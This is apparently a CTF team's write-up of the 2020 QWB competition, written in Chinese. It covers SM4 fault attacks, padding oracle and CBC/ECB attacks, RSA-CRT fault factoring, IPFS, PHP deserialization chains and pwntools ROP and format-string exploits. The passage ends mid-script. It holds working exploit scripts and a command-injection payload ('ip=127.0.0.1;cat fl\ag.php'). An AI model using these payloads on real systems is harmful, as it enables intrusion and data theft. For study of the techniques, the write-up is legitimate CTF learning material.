s.add( 264405 * key[11]+ 135302 * key[12]+ 278196 * key[9]+ -132906 * key[23]+ 138308 * key[7]+ 40423 * key[21]+ 157781 * key[0]+ -38949 * key[27]+ -143324 * key[14]+ -120743 * key[10]+ 77375 * key[5]+ -164339 * key[3]+ 167370 * key[25]+ -225830 * key[4]+ -136952 * key[2]+ -14347 * key[8]+ 6966 * key[26]+ 88628 * key[18]+ 138998 * key[22]+ 147747 * key[19]+ -106792 * key[6]+ -113009 * key[20]+ 98136 * key[15]+ 231264 * key[24]+ -109447 * key[17]+ 258890 * key[1]+ 167885 * key[16]+ 246315 * key[13] == 133068723 )


flag = ''
if s.check() == sat:
    result = s.model()
    print s.model()
    for i in range(28):
        flag += chr(result[key[i]].as_long().real)
    print flag
    print len('flag{g0_Fuck_xx_5egm3nt')
```

### imitation_game
fork后子进程是一个CBC AES，正确后，父进程启动了一个chip8程序，这里的字节码进行过更改，打log后，分析，是一个
```
v0
+2

v1
+1

v2
+1
xor 1

*********
v3
+3

v4
+2

v5
xor 2
+1
***********
v6
*2

v7
+1

v8
xor 1
+1
*************
v9
+2
```
先对输入做上面的操作
然后进入27a这个乘法
俩个参数，一个输入一个乘法系数
1 2 1 
2 1 1 
1 2 2
系输如上，三组循环，解方程即可
```
# -*- coding: UTF-8 -*-
from z3 import *
s = Solver()
key = [BitVec('%d'%i,8) for i in range(3)]

s.add(key[0]+2*key[1]+key[2] == 0x37)
s.add(2*key[0]+key[1]+key[2] == 0x37)
s.add(key[0]+2*key[1]+2*key[2] == 0x3b)
flag = ''
if s.check() == sat:
    print s.model()
aaa = [10,2,13,14,15,1,2,12,1,3]
flag = 'flag{6c8f1d78770fe672122478c6f9a150e6'
for i in range(len(aaa)):
    flag += str(hex(aaa[i]).replace('0x',''))
flag += '}'
print flag
```
算出来是a2def12c13

## Crypto
### fault

differential fault attack SM4

找paper：

Min WANG,Zhen WU,Jin-tao RAO,Hang LING. Round reduction-based fault attack on SM4 algorithm[J]. Journal on Communications, 2016, 37(Z1): 98-103.

这篇不太行，直接把最后的几轮给扔了，不太realistic；不过从中学到了SM4的构造，以及SM4的DFA相关研究

找到了https://eprint.iacr.org/2010/063.pdf

> We show that if a random byte fault is induced into either the second, third or fourth word register at the input of the 28-th round, the 128-bit master key could be derived with an exhaustive search of 22.11 bits on average. 

28轮的第2、3、4个寄存器出错，可以直接整出master key，很对头，但是有点难理解

> The procedure of the round-key generation indicates that the master key can be easily retrieved from any four consecutive round-keys.


然后几个paper轮流看。

![](https://hackmd.summershrimp.com/uploads/upload_bbc71b52cfdefddb249b337787f0c652.png)

选择了需要fault次数最多的那个方法。（因为容易理解一些

paper：https://wenku.baidu.com/view/df86818e79563c1ec5da71c4.html

出题人没整好输入的round（只能在第2～31轮注入fault， 而非1～32轮），所以操作的时候就稍微需要自己改变一下

![](https://hackmd.summershrimp.com/uploads/upload_ee8ac49c5879017f86dfc47f2778e39c.png)

往第31轮的X30上注入1byte的fault，将会导致第32轮的X34的差分值有1byte不为0。

然后往F函数里面日：

![](https://hackmd.summershrimp.com/uploads/upload_944a8f9c6845bac7c504f38481822778.png)

可以激活一个sbox：必有一个sbox的差分值不为0（其他3个sbox均为0），且这个sbox的位置可控；这个sbox的两个差分输入r_inp, f_inp 也能确定下来。

> r_byte: raw input byte
> f_byte: fault input byte

再来从下往上看这个sbox输出的差分值：

![](https://hackmd.summershrimp.com/uploads/upload_e1c2ffc280b41e4a1e98b99227cd24d9.png)

paper里有具体的分析，看不懂，直接看到结论。这个结论就是说sbox输出的差分值diff_out也能确定下来。

ok，然后穷举这个sbox所对应那一byte子密钥rk_byte（仅256种可能，一个子密钥有4byte，每1byte对应一个sbox），计算sbox(r_inp ^ rk_byte) ^ sbox(f_inp ^ rk_byte)，看是否等于diff_out，如果等于就说明这个byte可以作为备选子密钥byte（理论值是说这边有2.0236个可能的candidate子密钥byte）。两次这么操作后，基本上就可以确定下这个byte到底是哪一个了。

然后这么再去另外3个sbox对应的位置处注入fault，即可恢复出这第32轮的4byte子密钥。

恢复出来后，可以解密一轮来到第31轮，往第30轮的X29处注入fault，等价于往第31轮的X33处注入，然后同样的操作，可以恢复这第31轮的子密钥。

再恢复2轮，即可得到第30、29轮的子密钥。

key schedule可逆，能通过这最后4轮的子密钥直接搞到master key

最后解密，getflag

脚本很乱：
```python
from collections import Counter
import random
from itertools import product
from hashlib import sha256
from pwn import *

from sm4 import *
from func import xor, rotl, get_uint32_be, put_uint32_be, \
        bytes_to_list, list_to_bytes, padding, unpadding


token = b"icq3f18237ca27013a7969864ab40836"

r = remote("39.101.134.52", 8006)
# context.log_level = 'debug'

# PoW
rec = r.recvline().decode()
suffix = re.findall(r'XXX\+([^\)]+)', rec)[0]
digest = re.findall(r'== ([^\n]+)', rec)[0]
print(f"suffix: {suffix} \ndigest: {digest}")
print('Calculating hash...')
for i in product(string.ascii_letters + string.digits, repeat=3):
    prefix = ''.join(i)
    guess = prefix + suffix
    if sha256(guess.encode()).hexdigest() == digest:
        print(guess)
        break
r.sendafter(b'Give me XXX:', prefix.encode())

r.sendafter(b"teamtoken", token)

r.recvuntil(b"your flag is\n")
enc_flag = r.recvline().strip()
print(enc_flag)


plaintext = b"\x00" * 15





def ltor(b, l):
    bits = bin(b)[2:]
    return int(bits[-l:] + bits[:-l], 2)

def inv_Y(cipher):
    # bytes -> list
    Y0 = get_uint32_be(cipher[0:4])
    Y1 = get_uint32_be(cipher[4:8])
    Y2 = get_uint32_be(cipher[8:12])
    Y3 = get_uint32_be(cipher[12:16])
         # X32, X33, X34, X35
    return [Y3,  Y2,  Y1,  Y0]

def inv_round(Xs):
    return [Xs[-1], Xs[0], Xs[1], Xs[2]]


def get_rk_byte(raw_cipher, fault_ciphers, j):
    r_res, r_X32, r_X33, r_X34 = inv_round(raw_cipher)
    r_byte   = put_uint32_be(r_X32 ^ r_X33 ^ r_X34)[j%4]

    ios = []
    for f_cipher in fault_ciphers:
        f_res, f_X32, f_X33, f_X34 = inv_round(f_cipher)
        diff_out = ltor(put_uint32_be(r_res ^ f_res)[(j-1)%4], 2)
        f_byte = put_uint32_be(f_X32 ^ f_X33 ^ f_X34)[j%4]
        ios.append((f_byte,diff_out))
    # print(ios)

    candidate_keys = Counter()
    for rk_byte in range(256):
        for f_byte, diff_out in ios:
            if SM4_BOXES_TABLE[r_byte^rk_byte] ^ SM4_BOXES_TABLE[f_byte^rk_byte] == diff_out:
               candidate_keys[rk_byte] += 1
    return candidate_keys.most_common()[0][0]

def get_r_cipher():
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"your plaintext in hex:", plaintext.hex().encode())
    cipher = bytes.fromhex(r.recvline().strip().decode().split("hex:")[1])
    return cipher


def get_f_cipher(round, j):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"your plaintext in hex:", plaintext.hex().encode())
    r.sendlineafter(b"give me the value of r f p:", f"{round} {random.getrandbits(8)} {j}")
    cipher = bytes.fromhex(r.recvline().strip().decode().split("hex:")[1])
    return cipher

def f(x0, x1, x2, x3, rk):
    # "T algorithm" == "L algorithm" + "t algorithm".
    # args:    [in] a: a is a 32 bits unsigned value;
    # return: c: c is calculated with line algorithm "L" and nonline algorithm "t"
    def _sm4_l_t(ka):
        b = [0, 0, 0, 0]
        a = put_uint32_be(ka)
        b[0] = SM4_BOXES_TABLE[a[0]]
        b[1] = SM4_BOXES_TABLE[a[1]]
        b[2] = SM4_BOXES_TABLE[a[2]]
        b[3] = SM4_BOXES_TABLE[a[3]]
        bb = get_uint32_be(b[0:4])
        c = bb ^ (rotl(bb, 2)) ^ (rotl(bb, 10)) ^ (rotl(bb, 18)) ^ (rotl(bb, 24))
        return c
    return (x0 ^ _sm4_l_t(x1 ^ x2 ^ x3 ^ rk))




def decrypt_one_round(cipher, rk):
    return [f(cipher[3], cipher[0], cipher[1], cipher[2], rk), cipher[0], cipher[1], cipher[2]]


def decrypt_rounds(cipher, rks):
    for rk in rks:
        cipher = decrypt_one_round(cipher, rk)
    return cipher

raw_cipher = inv_Y(get_r_cipher())
print(raw_cipher)

rks = []
for round in range(31, 27, -1):
    # print(round)

    rk = 0
    for j in range(4):
        fault_ciphers = set()
        for k in range(10):
            fault_ciphers.add(get_f_cipher(round, j))
        fault_ciphers = [inv_Y(i) for i in fault_ciphers]

        fault_ciphers = [decrypt_rounds(f_cipher, rks) for f_cipher in fault_ciphers]

        rk_byte = get_rk_byte(raw_cipher, fault_ciphers, j)
        rk = (rk << 8) + rk_byte
    print(f"round {round+1} subkey: {rk}")
    rks.append(rk)

    raw_cipher = decrypt_one_round(raw_cipher, rk)

def _round_key(ka):
    b = [0, 0, 0, 0]
    a = put_uint32_be(ka)
    b[0] = SM4_BOXES_TABLE[a[0]]
    b[1] = SM4_BOXES_TABLE[a[1]]
    b[2] = SM4_BOXES_TABLE[a[2]]
    b[3] = SM4_BOXES_TABLE[a[3]]
    bb = get_uint32_be(b[0:4])
    rk = bb ^ (rotl(bb, 13)) ^ (rotl(bb, 23))
    return rk

# def set_key(key, mode):
    # key = bytes_to_list(key)
    # sk = []*32
    # MK = [123, 456, 789, 145]
    # k = [0]*36
    # MK[0] = get_uint32_be(key[0:4])
    # MK[1] = get_uint32_be(key[4:8])
    # MK[2] = get_uint32_be(key[8:12])
    # MK[3] = get_uint32_be(key[12:16])
    # k[0:4] = xor(MK[0:4], SM4_FK[0:4])
    # for i in range(32):
    #     k[i + 4] = k[i] ^ (
    #         _round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]))
    #     sk[i] = k[i + 4]
    # return sk

def inv_key_schedule(rks): # rks: [rk32, rk31, rk30, rk29]
    k = [0] * 32 + rks[::-1]
    for i in range(31, -1, -1):
        k[i] = k[i+4] ^ (_round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]))
    print(k[4:])

    Mk = [0] * 4
    for j in range(4):
        Mk[j] = SM4_FK[j] ^ k[j]

    master_key = []
    for i in range(4):
        master_key += put_uint32_be(Mk[i])
    return list_to_bytes(master_key)



Mk = inv_key_schedule(rks)
print(Mk)


r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"your key in hex:", Mk.hex().encode())
r.sendlineafter(b"your ciphertext in hex:", enc_flag)
r.recvuntil(b"your plaintext in hex:")
flag = r.recvline().strip().decode()
print(bytes.fromhex(flag))


r.interactive()
```

但是能getflag：

![](https://hackmd.summershrimp.com/uploads/upload_80b51b89dfd332c4c8c86c69fe16698d.png)




### modestudy
第一关 cbc bit flip，把第一块密文的最后一字节xor上0x1即可

第二关 

![](https://hackmd.summershrimp.com/uploads/upload_7b66e6dda856cd1cf3f9c8ab71abcb68.png)

扔给服务器两个一样的c1、c2，然后iv = (c1 ^ p2) ^ p1

第三关 

![](https://hackmd.summershrimp.com/uploads/upload_159b1c4e457f109f16b6c8ba0e45486b.png)

把第3块密文换成第5块密文

第四关 低配版 BEAST Attack

第五关 几次尝试后，发现它的加密实际上就是对每2byte进行置换，列一个置换表出来，即可找到secret

第六关 padding oracle attack

```python
import re
import time
import random
import string
from hashlib import sha256

from Crypto.Util.number import long_to_bytes, bytes_to_long
from pwn import *


TOKEN = "icq3f18237ca27013a7969864ab40836"

r = remote("139.224.254.172", 7777)
# context.log_level = "debug"


# PoW
def proof_of_work():
    rec = r.recvuntil(b"?=").decode()
    prefix = re.findall(r"\(([a-zA-Z0-9]{8})\+", rec)[0].encode()
    print(prefix)

    start = time.time()
    while True:
        answer = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
        hashresult = hashlib.sha256(prefix+answer.encode()).digest()
        bits = ''.join(bin(j)[2:].zfill(8) for j in hashresult)
        if bits.startswith('0'*5):
            print(answer)
            break
    print(time.time() - start)

    r.sendline(answer.encode())

proof_of_work()
r.sendlineafter(b"teamtoken=", TOKEN)

def xor(a, b):
    return bytes(x^y for x,y in zip(a,b))

def solve_1():
    r.sendlineafter(b"your choice:", b"1")
    r.recvuntil(b"challenge 1\n")
    data = r.recvline().decode()
    session = re.findall(r"session=([0-9a-f].*?);", data)[0]
    checksum = re.findall(r"checksum=([0-9a-f].*?)\n", data)[0]
    print(f"session: {session}\nchecksum: {checksum}")
    checksum = bytes.fromhex(checksum)

    raw_data = f"session={session};admin=0".encode()
    target_data = f"session={session};admin=1".encode()
    nex_checksum = xor(checksum, b"\x00"*15 + b"\x01" + b"\x00"*16)

    payload = target_data + b";" + b"checksum=" + nex_checksum.hex().encode()
    print(payload)
    r.sendlineafter(b"cookie:", payload)

def solve_2():
    r.sendlineafter(b"your choice:", b"2")
    r.recvuntil(b"challenge 2\n")
    hexdigest = r.recvline().decode()[15:-1]
    print(f"Challenge2 sha256(iv): {hexdigest}")

    # r.sendlineafter(b"your choice:", b"1") # server decrypt for us
    # c = b"11"*32
    # r.sendlineafter(b"c:", c)

    # decrypt = bytes.fromhex(r.recvline()[4:-1].decode())
    # print(len(decrypt))
    # plain1, plain2 = decrypt[:16], decrypt[16:32]
    # print(plain1.hex(), plain2.hex())
    # xor_vector = xor(b"11"*16, plain2)
    # iv = xor(xor_vector, plain1)
    # print(iv) # b'\x8c t\xeb\x83\xfb\x1c\xac\xfa\xa4hk{\xbe\xcf|'

    iv = b'\x8c t\xeb\x83\xfb\x1c\xac\xfa\xa4hk{\xbe\xcf|'
    print(f"Challenge2 IV: {iv.hex()}")
    print(f"Challenge2 sha256(IV): {sha256(iv).hexdigest()}")

    r.sendlineafter(b"your choice:", b"2") # guess iv
    r.sendlineafter(b"iv(encode hex):", iv.hex().encode())

def solve_3():
    r.sendlineafter(b"your choice:", b"3")
    r.recvuntil(b"challenge 3\n")

    r.recvuntil(b"128bit_ecb_encrypt(cookie):")
    cipher = bytes.fromhex(r.recvline().strip().decode())
    c1 = cipher[:16]    # session:e8766bf7
    c2 = cipher[16:32]  # ;timedl=1;admin=
    c3 = cipher[32:48]  # 0;guess_cookie_m
    c4 = cipher[48:64]  # a=1;guess_mp_ab=
    c5 = cipher[64:80]  # 1;guess_cookie_m
    c6 = cipher[80:96]  # b=0;hell_pad=233

    payload = c1 + c2 + c5 + c4 + c5 + c6
    r.sendlineafter(b"input your encrypted cookie(encode hex):", payload.hex().encode())


def solve_4():
    r.sendlineafter(b"your choice:", b"4")
    r.recvuntil(b"challenge 4\n")

    secret = b"i\x87Z\x029\x94\x90\xaagr\x18<m*\x81\x0f"

    for i in range(16-len(secret), 0, -1):
        inp = b"1"*(i-1)
        r.sendlineafter(b"your choice:", b"1")
        r.sendlineafter(b"input(encode hex):", inp.hex().encode())
        r.recvuntil(b"before encrypted:")
        print(r.recvline())
        r.recvuntil(b"encrypted msg: ")
        cipher = r.recvline().decode().strip()[:32]
        print(f"cipher: {cipher}")
        for j in range(256):
            r.sendlineafter(b"your choice:", b"1")
            r.sendlineafter(b"input(encode hex):", (inp + secret + bytes([j])).hex().encode())
            r.recvuntil(b"encrypted msg: ")
            c = r.recvline().decode().strip()[:32]
            print(f"c: {c}")
            if cipher in c:
                secret += bytes([j])
                break
        else:
            r.close()
        print(i, secret)

    r.sendlineafter(b"your choice:", b"2") # secert
    r.sendlineafter(b"secret", secret.hex().encode())


def solve_5():
    r.sendlineafter(b"your choice:", b"5")
    r.recvuntil(b"challenge 5\n")

    # hexdigest = "deb36c8f64034db192a896fb067f381240a1edd776c07f31b1bef33ec3998e6e"
    # encrypt_secret = "75b1c0ebc5dfcabe784ea85ee2a28a52"

    # table = dict()
    # for i in range(0, 256**2, 256):
    #     payload = ''
    #     for j in range(i, i+256):
    #         payload += hex(j)[2:].zfill(4)
    #     r.sendlineafter(b"your choice:", b"1")
    #     r.sendlineafter(b"input(encode hex):", payload.encode())
    #     r.recvuntil(b'myblockencrypt_ecb(your_input).encode("hex"):')
    #     cipher = r.recvline().strip().decode()
    #     for k, j in enumerate(range(i, i+256)):
    #         table[cipher[k*4:k*4+4]] = hex(j)[2:].zfill(4)
    #     print(i)

    # for i in range(0, len(encrypt_secret), 4):
    #     secret += table[encrypt_secret[i:i+4]]
    # print(secret)
    secret = 'cdf3ff86aeb04a7fdb1614043964349c'

    r.sendlineafter(b"your choice:", b"2") # secert
    r.sendlineafter(b"secret", secret.encode())


def solve_6():
    r.sendlineafter(b"your choice:", b"6")
    r.recvuntil(b"challenge 6\n")

    iv = bytes.fromhex("31313131313131313131313131313131")
    c1 = bytes.fromhex("ab852396af79701989fdeafca2e8a5457db6307920981252c49622d9c5428917")[:16]

    secret = b'M\x1fC^\xbc\x8f}N\xc4\x06lG\x16\xa9\xbdS'

    for i in range(15-len(secret), -1, -1):
        for j in range(0, 256):
            print(j)
            new_iv = xor(iv, b"\x00"*i + bytes([j]) + xor(secret, bytes([16-i])*(16-i)))
            payload = new_iv + c1
            r.sendlineafter(b"your choice:", b"1")
            r.sendlineafter(b"input your iv+c (encode hex):", payload.hex().encode())
            if b"success" in r.recvline():
                secret = bytes([(16-i) ^ j]) + secret
                break
        else:
            r.close()
        print(i, secret)

    r.sendlineafter(b"your choice:", b"2") # secert
    r.sendlineafter(b"secret", secret.hex().encode())


solve_1()
solve_2()
solve_3()
solve_4()
solve_5()
solve_6()

r.interactive()
```

![](https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png)

## Blockchain
### IPFS

可以通过命令`ipfs cat <hash> > i.data`把pic1.jpg的6块block给下载下来，很明显第4条hash对应jpg文件的开头，第5条hash对应jpg文件的结尾

剩余的4块可以穷举拼接一下，看能不能恢复成正常的图形：

```python
from itertools import permutation

pics = []
for i in range(0,6):
    pics.append(open(f"{i}.data", "rb").read())
    
for perm in permutations([0,1,2,5], 4):
    data = pics[3] # 4th hash
    for i in perm:
        data += pics[i]
    data += pics[4] # 5th hash
    with open(f"{''.join(str(i) for i in perm)}.jpg", "wb") as f:
        f.write(data)
```

发现0213.jpg可以正常显示：

![Screen Shot 2020-08-23 at 2.32.56 AM](https://i.loli.net/2020/08/23/WhGOoXKJQVyH4c2.png)

pic2.jpg，给出了文件的sha256sum，根据QmHash的格式，可以得到pic2.jpg的QmHash：

![image-20200823023341028](https://i.loli.net/2020/08/23/vsh6M3fpr9OAx2Q.png)

```python
import base58

print(base58.b58encode(bytes.fromhex("1220"+"659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e")))
# b'QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3'
```

`ipfs cat QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 > pic2.jpg`可以得到第二张图片：

![Screen Shot 2020-08-23 at 2.36.21 AM](https://i.loli.net/2020/08/23/yltfSPeMgpYLJUu.png)

组合起来就是：`flag=flag{md5( hash1 + hash2 )}`

hash2已经有了：QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3

hash1可以通过再重新上传pic1.jpg得到。

观察发现出题人上传pic1.jpg时，设置的block-size是26624

看一下`ipfs add --help`发现能够通过`--chunker=size-26624`指定block的大小

![Screen Shot 2020-08-23 at 2.39.27 AM](https://i.loli.net/2020/08/23/1hvuTxL9gWVQJpj.png)

重新上传得到root hash：QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7


flag{35fb9b3fe44919974a02c26f34369b8e}




## 强网先锋

###	主动
ip=127.0.0.1;cat%20fl\ag.php


###	upload

流量包题

分析流量包可知，上传了一个steghide.jpg文件，将其导出，`steghide extract -sf steghide.jpg`，密码123456，得到flag.txt

flag{te11_me_y0u_like_it}

###	Funhash


web题 http://39.101.177.96/
payload
```
http://39.101.177.96/?hash1=0e251288019&hash2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&hash3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&hash4=ffifdyop
```

### web辅助
http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/  
签到题，看脚本吧，没什么难度
```
<?php
class topsolo{
    protected $name;

    public function __construct($name = 'Riven'){
        $this->name = $name;
    }

    public function TP(){
        if (gettype($this->name) === "function" or gettype($this->name) === "object"){
            $name = $this->name;
            $name();
        }
    }


}

class midsolo{
    protected $name;

    public function __construct($name){
        $this->name = $name;
    }

    public function __wakeup(){
        if ($this->name !== 'Yasuo'){
            $this->name = 'Yasuo';
            echo "No Yasuo! No Soul!\n";
        }
    }


    public function __invoke(){
        $this->Gank();
    }

    public function Gank(){
        if (stristr($this->name, 'Yasuo')){
            echo "Are you orphan?\n";
        }
        else{
            echo "Must Be Yasuo!\n";
        }
    }
}

class jungle{
    protected $name = "";

    public function __construct($name = "Lee Sin"){
        $this->name = $name;
    }

    public function KS(){
        echo "triggered";
    }

    public function __toString(){
        $this->KS();
        return "";
    }

}

class player{
    protected $user;
    protected $pass;
    protected $admin;

    public function __construct($user, $pass, $admin = 0){
        $this->user = $user;
        $this->pass = $pass;
        $this->admin = $admin;
    }

    public function get_admin(){
        return $this->admin;
    }
}

function read($data){
    $data = str_replace('\0*\0', chr(0)."*".chr(0), $data);
    return $data;
}

function write($data){
    $data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);
    return $data;
}

$jungle = new jungle();
$mid = new midsolo($jungle);
$top = new topsolo($mid);

$exp = serialize($top);
$exp = str_replace("s:7:\"\x00*\x00name\"", 'S:7:"\00*\00\6eame"', $exp);
echo strlen($exp) . "\n";
var_dump($exp);

$username =  str_repeat('\0*\0', 13) . 'a';
$password =  "aaa\";s:8:\"\0*\0admin\";" . $exp . "s:7:\"\0*\0user\";s:2:\"12\";}";
$password = str_replace('}}', "\"s:2:\"zz\";s:2:\"12\";}}", $password);
echo urlencode($username) . "\n";
echo base64_encode($password) . "\n";

//system("curl -vv http://eci-2zei1qumnps7yxtlfg2a.cloudeci1.ichunqiu.com/?username=" . urlencode($username) . "&password=" . urlencode($password));
echo "curl -vv http://eci-2zei1qumnps7yxtlfg2a.cloudeci1.ichunqiu.com/?username=" . urlencode($username) . "&password=" . urlencode($password) . "\n";
$player = new player($username, $password);

$dump = write(serialize($player));
$dump = read($dump);
echo base64_encode($dump) . "\n";

var_dump(unserialize($dump));

var_dump($dump);
```


###	侧防
rev
xor key后有个换位操作，做对应逆运算即可
```
  a = 'QWBlogs'
b = [0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,
  0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,
  0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,
  0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]
d = [0]*len(b)
c = ''
for i in range(0,len(b),4):
    d[i] = b[i+1]
    d[i+1] = b[i+2]
    d[i + 2] = b[i + 3]
    d[i + 3] = b[i]
print d
for i in range(len(b)):
    c += chr((d[i]-65)^ord(a[i%7]))
print c
print len(b)
print len(c)
```

###	baby_crt
crypto

RSA CRT fault

http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf

![](https://hackmd.summershrimp.com/uploads/upload_7487dc2dc6748d87889114d2ddd279d6.png)

```python
from hashlib import sha1
from Crypto.Util.number import *

n = 26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997
m = 26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540
sigature = 20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246
e = 65537

for c1 in range(1, 2**16):
    g = GCD(pow(m, c1, n) - pow(sigature, e, n), n)
    if g != 1:
        p = g
        print(c1, g)
        break
q = n // p
print("flag{" + sha1(long_to_bytes(min(p,q))).hexdigest() + "}")
# 27152 175947855464630318882274211369050447335314682338022384131546160543733195355501291230119719123032944939427500196558321955068490980548179604648557892933129317527213012520680627573834567002223872890806611275061140244033706361520509332755932759567357620312030849014630507761409535339555754829420991613721802012281
# flag{601cb6f6d990ed5b89cf0de60508a95c07543793}
```
### babymessage
可以覆盖ebp，因为没开pie，所以直接栈迁移到bss上导致了第二次调用时候会栈溢出。
```python=
from pwn import *
#r=process('./babymessage')
r=remote('123.56.170.202',21342)
main_addr=0x00000000040091A
def leave_name(name):
    r.sendlineafter('choice','1')
    r.sendafter('name',name)

def lmessage(content):
    r.sendlineafter('choice','2')
    r.sendafter('message',content)

def show():
    r.sendlineafter('choice','3')

def gd(cmd=''):
    gdb.attach(r,cmd)
    pause()
pd=0x0000000000400ac3
psr=0x0000000000400ac1
backdoor=0x000000000040080A
elf=ELF('./babymessage')
libc=ELF('./libc-2.27.so')
leave_name('$0')
lmessage('b'*8+p64(0x6010d0+4))
lmessage('b'*8+p64(0x6010d0+4)+p64(pd)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(pd)+p64(0x100)+p64(backdoor))
r.recvuntil('\n')
r.recvuntil('\n')
r.recvuntil('\n')
leak=u64(r.recv(6).ljust(8,'\x00'))
print 'leak '+hex(leak)
lbase=leak-libc.symbols['puts']
print 'lbase '+hex(lbase)
sys=lbase+libc.symbols['system']
one=0x10a45c+lbase
#gd('b *0x0000000000400886')
r.send('b'*8+p64(0x6010d0+4)+p64(one))
#r.send('b'*8+p64(0x6010d0+4)+p64(pd)+p64(0x00000000006010D0)+p64(sys))
r.interactive()
```

### bank
no negative check for amount

transact
Alice -1000
get flag

![](https://hackmd.summershrimp.com/uploads/upload_28920235447ac58455a8fc5ce744baac.png)

### 红方辅助
分析一下流量的格式，解解密就行

```python
import struct
import multiprocessing
import random
from hashlib import md5, sha256


def GetSalt(data):
    return int((md5(sha256(data.encode()).digest())).hexdigest(), 16) % 256


funcs = {
    "0" : lambda x, y : x - y,
    "1" : lambda x, y : x + y,
    "2" : lambda x, y : x ^ y
}

inv_func = {
    "0" : lambda x, y : x + y,
    "1" : lambda x, y : x - y,
    "2" : lambda x, y : x ^ y,
}

offset = {
    "0" : 0xefffff,
    "1" : 0xefffff,
    "2" : 0xffffff,
}

data = open("socket.data", "rb").read()



index = 0

while index < len(data)-100:
    header = data[index:index+19]
    data_length = int.from_bytes(header[13:17], byteorder='little') - 10
    # print(data_length)

    btime = header[1:1+4]
    fn   = chr(int(header[17]))

    t = struct.unpack("<i", btime)[0]
    boffset = offset[fn]
    t -= boffset
    t = struct.pack("<i", t)

    salt = int(header[18])
    cipher = data[index+19:index+19+data_length]

    # print(salt, t, cipher)
    plain = ""
    i = 0
    for c in cipher:
        plain += chr(((inv_func[fn](c, salt)) ^ t[i]) % 256)
        i = (i + 1) % 4
    print(plain)

    index += 9 + 10 + data_length + 4

```


![](https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png)

得到3e752bf509ddb4e9a42f1ef30beff495

flag提交一直不对，改一下格式即可：QWB{3e752bf509ddb4e9a42f1ef30beff495}


### Siri - 强网先锋
一个简单的格式化字符串,leak了stack地址之后就是对上面的地址进行一个返回地址和保存的rbp进行一个修改,通过抬栈 执行 one_gadget
```python=
from pwn import*
p = process('./main')
p = remote('123.56.170.202',12124)
libc = ELF('./libc-2.27.so')
p.sendlineafter('>>> ','Hey Siri!')
offset = 14
p.sendlineafter('>>> ','Remind me to  ' + 'BBBBAAAAAAAAStack:%46$pLIBC:%83$pPROC:%47$pCanary:%45$p')
p.recvuntil('Stack:')
stack = int(p.recv(14),16) - 288
log.info('Stack:\t' + hex(stack))
p.recvuntil('LIBC:')
libc_base = int(p.recv(14),16) - 231 - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('PROC:')
proc_base = int(p.recv(14),16) - 0x144C
log.info('Proc:\t' + hex(proc_base))
p.recvuntil('Canary:')
canary = int(p.recv(18),16)
log.info('Canary:\t' + hex(canary))
pop_rdi_ret = proc_base  + 0x0152B
leave_ret = proc_base + 0x12E2
rce = libc_base + 0x10A45C
open_sys = libc_base + libc.sym['open']
read_sys = libc_base + libc.sym['read']
puts = libc_base + libc.sym['puts']

p.sendlineafter('>>> ','Hey Siri!')
off_1 = (((stack + 0x50)&0xFFFF))
off_2 = (leave_ret&0xFFFF)
#gdb.attach(p,'b *0x5555555552A2')
if off_1 > off_2:
